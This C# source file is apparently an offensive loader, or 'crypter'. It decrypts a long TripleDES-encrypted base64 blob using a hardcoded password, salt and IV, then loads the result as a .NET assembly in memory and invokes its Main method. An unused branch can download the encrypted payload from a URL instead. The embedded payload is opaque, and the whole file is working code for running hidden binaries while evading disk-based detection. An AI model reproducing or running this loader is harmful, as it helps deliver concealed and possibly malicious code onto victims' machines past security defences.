using System;
using System.Text;
using System.Security.Cryptography;
using System.Reflection;
using System.IO;
using _3DESv2;
using System.Collections.Generic;
using System.Net;

namespace _3DESv2
{
    class Program
    {
        static void Main(string[] args)
        {

            string Password = "oqphnbt0kuedizy4m3avx6r5lf21jc8s";
            string EncryptedBinaryFile = "";
string EncryptedB64String = "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";
            string Salt = "vh9b4tsxrl1560wg8nda2meuc7yjzop3";
            string InitialVector = "SBFTWSDXBYVOEMTD";
            string DecryptedBinaryFilePath = "";
            string DownloadEncryptedBinaryFile = "";
            byte[] scriptBytes = new byte[] { };


            if (EncryptedBinaryFile != "")
            {
                scriptBytes = System.IO.File.ReadAllBytes(EncryptedBinaryFile);
            }
            else if (EncryptedB64String != "")
            {
                scriptBytes = System.Convert.FromBase64String(EncryptedB64String);
            }
            else if (DownloadEncryptedBinaryFile != "")
            {
                WebClient client = new System.Net.WebClient();
                scriptBytes = client.DownloadData(DownloadEncryptedBinaryFile);
            }
            else 
            {
                Console.WriteLine("[-] Something went wrong!");
            }

            ASCIIEncoding encoding = new ASCIIEncoding();
            PasswordDeriveBytes derivedPass = new PasswordDeriveBytes(Password, encoding.GetBytes(Salt), "SHA1", 2);
            byte[] IV = encoding.GetBytes(InitialVector);
            byte[] Key = derivedPass.GetBytes(16);
            TripleDESCryptoServiceProvider TripleDESobject = new TripleDESCryptoServiceProvider();
            TripleDESobject.Mode = CipherMode.CBC;
            byte[] buffer = new byte[(scriptBytes.Length - 8)];
            ICryptoTransform TripleDESdecryptor = TripleDESobject.CreateDecryptor(Key, IV);
            MemoryStream EncryptedMemoryStream = new MemoryStream(scriptBytes);
            CryptoStream CryptoStreamDecrypt = new CryptoStream(EncryptedMemoryStream, TripleDESdecryptor, CryptoStreamMode.Read);
            int DecryptedData = CryptoStreamDecrypt.Read(buffer, 0, buffer.Length);
            //https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.gettypes?view=net-5.0
            Assembly assembly = Assembly.Load(buffer);
            Type type = assembly.GetTypes()[0];
            //MethodInfo method = assembly.EntryPoint;
            //object execute = method.Invoke(null, new Object[] { null });
            type.GetMethod("Main").Invoke(type, new Object[] { });
            CryptoStreamDecrypt.Close();
            TripleDESobject.Clear();
            //return 0;


        }
    }
}
